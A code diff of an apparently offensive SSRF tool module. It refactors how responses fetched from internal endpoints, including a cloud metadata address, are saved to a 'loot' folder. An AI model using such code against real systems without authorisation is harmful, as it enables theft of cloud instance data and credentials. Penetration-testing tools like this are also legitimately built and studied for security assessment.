@@ -1,5 +1,4 @@
 import logging
-import os
 
 from core.utils import *
 
@@ -20,14 +19,6 @@ class exploit:
         if r != None:
             default = r.text
 
-            # Create directory to store files
-            directory = requester.host
-            # Replace : with _ for window folder name safe
-            # https://www.ibm.com/docs/en/spectrum-archive-sde/2.4.1.0?topic=tips-file-name-characters
-            directory = directory.replace(":", "_")
-            if not os.path.exists(directory):
-                os.makedirs(directory)
-
             for endpoint in self.endpoints:
                 payload = wrapper_http(endpoint[1], endpoint[0], "80")
                 r = requester.do_request(args.param, payload)
@@ -42,11 +33,9 @@ class exploit:
                     if filename == "":
                         filename = endpoint[1].split("/")[-2:-1][0]
 
-                    logging.info(
-                        f"\033[32mWriting file\033[0m : {payload} to {directory + '/' + filename}"
-                    )
-                    with open(directory + "/" + filename, "w") as f:
-                        f.write(diff)
+                    output_path = loot_path(requester.host, filename)
+                    logging.info(f"\033[32mWriting file\033[0m : {payload} to {output_path}")
+                    output_path.write_text(diff, encoding="utf-8")
 
     def add_endpoints(self):
         self.endpoints.add(("100.100.100.200", "latest/meta-data/instance-id"))
